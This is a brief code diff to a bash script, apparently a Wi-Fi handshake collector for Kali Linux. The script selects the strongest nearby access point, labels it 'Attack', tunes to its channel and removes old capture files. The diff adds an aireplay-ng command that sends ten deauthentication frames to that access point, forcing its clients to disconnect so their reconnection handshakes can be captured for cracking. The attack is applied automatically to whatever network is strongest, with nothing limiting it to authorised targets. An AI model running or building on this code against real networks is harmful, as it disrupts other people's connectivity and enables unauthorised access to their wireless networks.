@@ -104,10 +104,11 @@ active() {
           fi
       
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
-          
+
           iwconfig $interface channel $Channel
           
-          
+          aireplay-ng -a $BSSID -0 10 $interface
+
          
           
           rm /home/kali/hscollector/shakes-* >/dev/null
